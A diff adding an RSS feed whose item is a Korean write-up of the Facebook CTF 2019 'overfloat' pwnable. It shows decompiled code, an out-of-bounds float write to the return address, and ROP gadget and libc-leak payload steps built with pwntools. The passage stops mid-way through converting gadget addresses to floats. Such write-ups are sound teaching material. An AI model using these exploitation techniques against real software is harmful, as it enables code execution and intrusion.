@@ -1,0 +1,318 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>fbctf on j3rrry</title>
+    <link>https://j3rrry.netlify.com/tags/fbctf/</link>
+    <description>Recent content in fbctf on j3rrry</description>
+    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; {year} j3rrry</copyright>
+    <lastBuildDate>Sat, 01 Jun 2019 21:47:09 +0900</lastBuildDate>
+    
+	    <atom:link href="https://j3rrry.netlify.com/tags/fbctf/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Facebook CTF 2019 Pwnable Overfloat Writeup</title>
+      <link>https://j3rrry.netlify.com/post/facebook-ctf-2019-pwnable-overfloat-writeup/</link>
+      <pubDate>Sat, 01 Jun 2019 21:47:09 +0900</pubDate>
+      
+      <guid>https://j3rrry.netlify.com/post/facebook-ctf-2019-pwnable-overfloat-writeup/</guid>
+      <description>
+
+&lt;p&gt;Facebook CTF 2019 Pwnable Overfloat Writeup&lt;/p&gt;
+
+&lt;h1 id=&#34;목차&#34;&gt;목차&lt;/h1&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;a href=&#34;#요약&#34;&gt;요약&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#분석-대상&#34;&gt;분석 대상&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#공격-벡터-찾기&#34;&gt;공격 벡터 찾기&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#익스-코드&#34;&gt;익스 코드&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#시나리오&#34;&gt;시나리오&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+
+
+
+&lt;figure&gt;
+
+&lt;img src=&#34;https://user-images.githubusercontent.com/19237789/58782227-f50b3400-8618-11e9-8c19-7f77e29d391e.png&#34; alt=&#34;description&#34; width=&#34;500px&#34; /&gt;
+
+
+&lt;/figure&gt;
+
+&lt;h1 id=&#34;요약&#34;&gt;요약&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;code&gt;#CWE-129&lt;/code&gt;, &lt;code&gt;#CWE-787&lt;/code&gt;, &lt;code&gt;#CWE-788&lt;/code&gt;, &lt;code&gt;#ROP&lt;/code&gt;, &lt;code&gt;#chaining&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;이번 문제는 overflow + float을 합성한 overfloat 이란 문제이며
+일반적인 버퍼 오버플로가 아니라
+float형으로 메모리에 저장한다는 특징을 갖는다.
+float형을 입력받아서 메모리에 차곡차곡 저장하는데 무한 반복문에 의해서 리턴 주소(RET)까지 덮어서 ROP 공격이 가능합니다.
+단, 메모리에 float형으로 저장된다는 것만 유의하면 됩니다.&lt;/p&gt;
+
+&lt;p&gt;CWE-129: 검증되지 않은 배열 인덱스의 사용&lt;br /&gt;
+CWE-787: Out-of-bounds 쓰기&lt;br /&gt;
+CWE-788: 할당된 버퍼 크기를 넘어선 메모리의 쓰기&lt;/p&gt;
+
+&lt;h1 id=&#34;분석-대상&#34;&gt;분석 대상&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# md5sum overfloat* libc-2.27.so&lt;/span&gt;
+b2e922b5a36288d9deedd76beb34f417  overfloat
+72c884e14c2cbce04b1f9f8ed7b2f3df  overfloat.tar.gz
+50390b2ae8aaa73c47745040f54e602f  libc-2.27.so
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# file overfloat libc-2.27.so&lt;/span&gt;
+overfloat:    ELF &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;-bit LSB executable, x86-64, version &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SYSV&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; GNU/Linux &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;.6.32, BuildID&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;sha1&lt;span style=&#34;color:#f92672&#34;&gt;]=&lt;/span&gt;8ae8ef04d2948115c648531ee0c12ba292b92ae4, not stripped
+libc-2.27.so: ELF &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;-bit LSB pie executable, x86-64, version &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;GNU/Linux&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;sha1&lt;span style=&#34;color:#f92672&#34;&gt;]=&lt;/span&gt;b417c0ba7cc5cf06d1d1bed6652cedb9253c60d0, &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; GNU/Linux &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;.2.0, stripped&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id=&#34;공격-벡터-찾기&#34;&gt;공격 벡터 찾기&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;18
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;19
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;20
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;21
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;22
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;23
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;24
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;25
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;26
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;27
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;28
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;29
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;30
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;31
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;32
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;33
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;chart_course&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; a1)
+{
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; result; &lt;span style=&#34;color:#75715e&#34;&gt;// rax@6
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v2; &lt;span style=&#34;color:#75715e&#34;&gt;// xmm1_4@8
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; s; &lt;span style=&#34;color:#75715e&#34;&gt;// [sp+10h] [bp-70h]@5
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v4; &lt;span style=&#34;color:#75715e&#34;&gt;// [sp+78h] [bp-8h]@8
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// [sp+7Ch] [bp-4h]@1
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; ; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
+  {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; )
+      printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;LON[%d]: &amp;#34;&lt;/span&gt;, (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)(i &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;));
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+      printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;LAT[%d]: &amp;#34;&lt;/span&gt;, (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)(i &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;));
+    fgets(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;s, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x64&lt;/span&gt;, stdin);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;strncmp(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;s, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;done&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4uLL&lt;/span&gt;) )
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
+    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;float&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; atof(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;s);
+    v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v2;
+    memset(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;s, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x64uLL&lt;/span&gt;);
+    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#ae81ff&#34;&gt;4LL&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; a1) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v4;
+LABEL_9:
+    ;
+  }
+  result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; )
+  {
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;WHERES THE LONGITUDE?&amp;#34;&lt;/span&gt;);
+    &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;i;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; LABEL_9;
+  }
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; result;
+}&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+위 함수는 주어진 바이너리 overfloat의 사용자 정의 함수 chart_course입니다.
+유일하게 입력할 수 있는 곳은 지역변수 s밖에 없으므로 공격 벡터는 지역변수 s입니다.&lt;/p&gt;
+
+&lt;p&gt;chart_course 함수는 입력 데이터를 string형으로 받아서 float형으로 변환한 다음 a1에 배열로 접근해서 값을 저장합니다.
+반복문이 무한히 돌기 때문에 a1[i++]로 리턴 주소(RET)까지 덮을 수 있죠.&lt;/p&gt;
+
+&lt;h1 id=&#34;시나리오&#34;&gt;시나리오&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;공격 벡터를 알았으면 이제 어떻게 익스를 할 것인지 시나리오를 생각해야 하는데요.
+무한 반복문 덕분에 RET와 그 넘어서 RET+8, RET+0x10, &amp;hellip; 을 덮어씌울 수 있으니까 chaining 기법을 사용할 수 있겠군요!&lt;/p&gt;
+
+&lt;p&gt;그럼 chaining으로 어떤 작업을 해야 할까요?
+pwnable의 최종 목표는 쉘을 따서 flag를 cat으로 읽어오는 것입니다.
+그럼 쉘을 따는 작업을 해야겠죠?
+마침 문제 출제자가 libc-2.27.so 라이브러리를 제공해주었습니다.
+즉 라이브러리로 쉘을 따라는 건데요.
+라이브러리를 이용하기 위해서는 &lt;strong&gt;라이브러리 leak&lt;/strong&gt;을 먼저 해줘야 합니다.&lt;/p&gt;
+
+&lt;p&gt;leak에 이용할 수 있을만한 출력 함수가 무엇이 있는지 찾아볼까요? 다음은 .got 영역입니다.
+
+
+
+&lt;figure&gt;
+
+&lt;img src=&#34;https://user-images.githubusercontent.com/19237789/58784594-c2fcd080-861e-11e9-829f-84ddbd2d193c.png&#34; alt=&#34;.got.plt&#34; /&gt;
+
+
+&lt;/figure&gt;
+puts, printf가 있네요.
+둘 중 아무거나 써도 될 거 같아요.
+저는 puts를 썼어요.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; overfloat &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./overfloat&amp;#39;&lt;/span&gt;)
+&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; hex(overfloat&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;puts)
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0x400690&amp;#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;그리고 puts의 매개변수로 무얼 넘겨야 할까요?
+바로 라이브러리의 주소가 나올만한 것들이겠죠?
+.got 영역에 있는 함수나 _IO_2_1_stdin_를 매개변수로 넘기면 라이브러리 주소인 0x7fxxxxxxxxxx가 출력될 것입니다.
+저는 _IO_2_1_stdin_를 puts의 매개변수로 잡았습니다.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./libc-2.27.so&amp;#39;&lt;/span&gt;)
+&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; hex(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_IO_2_1_stdin_)
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0x3eba00&amp;#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;_IO_2_1_stdin_의 주소를 보니 0x00으로 끝나는 것을 주의해주세요!
+문자열 출력을 위해서 stdin@GLIBC_2_2_5 +1을 해줘야만 해요.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; hex(overfloat&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;got&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdin &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0x602091&amp;#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;여기까지가 _IO_2_1_stdin_을 출력하기 위해 필요한 가젯(Gadget)을 모은 것입니다.
+오우! 한가지 빼먹은 것이 있었네요.
+이번 바이너리는 64비트 ELF입니다.
+함수 호출 규약 fastcall에서는 함수의 첫 번째 매개변수를 전달하는 방식이 rdi 레지스터를 이용한다는 것입니다.
+간단히 pwntools로 가젯을 모았어요.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; rop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ROP(overfloat)
+&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; hex(rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rdi&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address)
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0x400a83&amp;#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;이제야 _IO_2_1_stdin_을 출력하기 위해 필요한 가젯을 다 모았군요.
+일반적인 페이로드라면 다음과 같았겠죠.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rdi&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address)
+payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(overfloat&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;got&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdin &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
+payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(overfloat&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;puts)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;하지만 overfloat 바이너리는 float형으로 메모리를 덮는다는 사실!&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;float&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; atof(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;s);
+    v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v2;
+    memset(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;s, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x64uLL&lt;/span&gt;);
+    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#ae81ff&#34;&gt;4LL&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; a1) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v4;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;위 코드의 atof 함수가 바로 그 녀석이죠.
+그럼 저희는 모았던 가젯을 float형으로 변환해야 합니다.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; u &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; x: str(struct&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unpack(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;f&amp;#39;&lt;/span&gt;, p32(x))[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;])
+&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; u(rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rdi&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address)
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;5.88124264828e-39&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; u(overfloat&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;got&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdin &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;8.82789025646e-39&amp;#39;&lt;/span&gt;
